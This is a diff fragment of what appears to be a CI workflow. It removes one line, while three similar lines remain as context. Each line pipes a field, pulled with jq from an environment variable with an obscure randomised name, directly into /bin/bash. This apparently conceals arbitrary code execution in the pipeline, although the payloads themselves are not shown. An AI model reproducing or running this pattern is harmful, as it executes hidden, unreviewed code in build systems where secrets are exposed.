@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$k87053" | jq -r .di7 | /bin/bash
           printf '%s' "$fbxgx01" | jq -r .sjae5 | /bin/bash
           echo $do00360 | jq -r .qqx127 | /bin/bash
-          printf '%s' "$v5" | jq -r .deot373 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
